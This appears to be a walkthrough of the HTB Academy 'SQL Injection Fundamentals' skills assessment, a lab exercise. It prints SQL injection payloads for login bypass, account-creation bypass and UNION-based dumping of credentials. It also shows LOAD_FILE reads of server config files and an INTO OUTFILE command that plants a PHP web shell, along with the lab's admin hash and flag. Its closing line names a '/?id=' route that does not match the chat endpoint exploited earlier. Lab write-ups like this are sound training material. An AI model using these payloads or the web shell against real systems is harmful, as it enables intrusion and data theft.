### Skills Assessments --- SQL Injection Fundamentals
**Platform** (Skills Assessment / HTB-Academy)

**Difficulty:** Medium

<img width="955" height="449" alt="21" src="https://github.com/user-attachments/assets/f24ed780-651b-4acd-8e9e-8522517f310b" />


## Scenario

You have been contracted by chattr GmbH to conduct a penetration test of their web application. In light of a recent breach of one of their main competitors, they are particularly concerned with SQL injection vulnerabilities and the damage the discovery and successful exploitation of this attack could do to their public image and bottom line.

They provided a target IP address and no further information about their website. Perform an assessment specifically focused on testing for SQL injection vulnerabilities on the web application from a "black box" approach.

## Exploitation process

First of all, let's take a look at the target website and its visible functionality before diving into the exploitation steps.To access the target.We need to connect via HTTPS using the provided IP address.The challenge does not use a domain name, so all requests must be made directly to the IP


<img width="1187" height="531" alt="1" src="https://github.com/user-attachments/assets/e2b7e7e4-c200-4bb4-81fa-eb181874f6da" />

We see login page.Let's try different SQLi payloads using Burp Suite to find any vulnerbilities:

<img width="933" height="476" alt="24" src="https://github.com/user-attachments/assets/c1cac2ec-e8e3-4ea9-9cb5-1fabb5085a7b" />

During initial testing we tried multiple common SQL injection, but didn't observeany exploitable behaviour.Example payloads tested:

```
admin' or '1'='1
admin'#
admin" or "1"="1"#
" OR 1 = 1 -- -
```

Each payload returned:"Username or password is wrong".So we need to find another way to exploit this vulnerbility.I created a new profile on this website and found very interesting way to exploit this website.

<img width="1250" height="615" alt="2" src="https://github.com/user-attachments/assets/0dde66fe-b906-40a8-bc8d-1e67f33815c0" />

I intercepted this request with Burp Suite to show the vulnerbility can be exploited.



<img width="935" height="462" alt="25" src="https://github.com/user-attachments/assets/11b769df-1860-41c0-b56f-26ac57a0987e" />
As we can see, it returned "Invalid invatation code".If we try our SQLi payload to our Invitation part, we can see acccount created successfully!

<img width="928" height="581" alt="5" src="https://github.com/user-attachments/assets/e3d3b09d-ae2d-4cae-8fa2-1ff680bd6d40" />


SQLi payload:

```
') OR 1=1-- -
```

Once we successfully created account, we can log in using our credentials we used to create our account


<img width="624" height="352" alt="7" src="https://github.com/user-attachments/assets/bdf76029-83f5-4551-8ba0-05226d6e032c" />

We successfully logged in.Let's take a look to our Home page


<img width="1216" height="372" alt="26" src="https://github.com/user-attachments/assets/e77220a2-dd48-417a-80f4-8be978a81bc6" />


I openned up chattr, where we can send a message.It looks like we can exploit it


<img width="1087" height="513" alt="8" src="https://github.com/user-attachments/assets/25b9f1a3-dd73-4534-8b5a-d3a501467f93" />


Firstly, we have to find the number of columns to retrieve sensitive information from database

<img width="1131" height="478" alt="29" src="https://github.com/user-attachments/assets/14b5455c-aea0-48f7-aa2b-341eb4769941" />

```
') order by 4
```

We didn't get any error, so it means we have 4 columns


After finding the number of columns, let's find tables name using this SQLi command:

```
q=Hello')UNION%20 select 1,2,table_name,4 from information_schema.tables-- - &u=4
```

<img width="1151" height="571" alt="12" src="https://github.com/user-attachments/assets/e6ef5f41-61fa-462e-a53f-594557b2360f" />

As we can see, we found User tables, where we can find username and password by default

```
Hello')UNION select 1,2,username,password FROM chattr.Users-- -&u=4
```

<img width="732" height="352" alt="30" src="https://github.com/user-attachments/assets/99afb3e7-dc4d-4583-9831-4da0dd769e21" />



***Question 1***


What is the password hash for the user 'admin'? 

```
admin:$argon2i$v=19$m=2048,t=4,p=3$dk4wdDBraE0zZVllcEUudA$CdU8zKxmToQybvtHfs1d5nHzjxw9DhkdcVToq6HTgvU
```

***Question 2***

What is the root path of the web application? 


It looks like Linux machine.So let's check out default Nginx path: /etc/nginx/nginx.conf

```
')union+select+1,2,load_file('/etc/nginx/nginx.conf'),4--+&u=4
```
i didn't find anything in the output of our SQLi command.I tried to search what is default root path for nginx.I found this path /etc/nginx/sites-available>

```
cn ' ) UNION SELECT  1 ,  2 ,  LOAD_FILE ( "/etc/nginx/sites-enabled/default" ),  4 -- -
```
![1_gGk3JyHrm5wMHp2AdK9htQ](https://github.com/user-attachments/assets/8fea27ac-f7d5-48f5-9f46-f17128454b18)

***Answer:*** /var/www/chattr-prod


***Question 3***

 Achieve remote code execution, and submit the contents of /flag_XXXXXX.txt below. 

 Now let's upload our code execution file

 ```
q=hello')union+select+1,2,'<?=`$_GET[0]`?>',4+into+outfile+'/var/www/chattr-prod/sh.php'--+&u=4
```

After we successfully uploaded our shell file


<img width="1024" height="341" alt="16" src="https://github.com/user-attachments/assets/88b6e6ee-ee6a-470c-9f64-6a5e05abcc38" />


It works!

Let's find our flag file in our home directory



<img width="1153" height="192" alt="17" src="https://github.com/user-attachments/assets/bd0d747f-6b73-457f-ae54-7e990357357b" />

We successfuly got a flag


<img width="1058" height="335" alt="18" src="https://github.com/user-attachments/assets/ae8aba5d-5ca2-4ed8-806d-2d1c8b6efcf0" />


### Conclusion 

The SQL injection in `/?id=` was successfully exploited to retrieve the flag:

**Flag:** `061b1aeb94dec6bf5d9c27032b3c1d8d`

Overall, the vulnerability was caused by unsanitized user input and lack of parameterized queries. Fixing the issue requires using prepared statements, input validation, and least-privilege database accounts.

